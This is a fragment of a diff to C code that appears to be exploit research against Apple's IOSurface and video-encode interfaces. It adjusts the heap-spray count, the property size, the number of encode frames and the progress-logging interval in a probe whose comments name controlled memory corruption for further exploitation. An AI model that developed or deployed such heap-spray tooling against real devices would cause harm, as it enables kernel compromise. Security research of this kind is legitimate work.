@@ -16992,9 +16992,9 @@ static void r449_probe(void) {
      * (b) Controlled corruption (for further exploitation)
      */
 
-    #define R449_SPRAY_COUNT 60
-    #define R449_PROP_SIZE 256
-    #define R449_ENCODE_COUNT 170
+    #define R449_SPRAY_COUNT 20
+    #define R449_PROP_SIZE 128
+    #define R449_ENCODE_COUNT 165
     #define R449_SCAN_MAGIC 0xDEADBEEF41414141ULL
 
     IOSurfaceRef spray_surfs[R449_SPRAY_COUNT];
@@ -17095,8 +17095,8 @@ static void r449_probe(void) {
         if (est == noErr) enc_ok++;
         else enc_fail++;
 
-        /* Log progress every 50 frames */
-        if ((frame + 1) % 50 == 0) {
+        /* Log progress every 25 frames */
+        if ((frame + 1) % 25 == 0) {
             rlog("    Submitted %d/%d (ok=%d fail=%d)\n",
                  frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail);
             fflush(stdout);
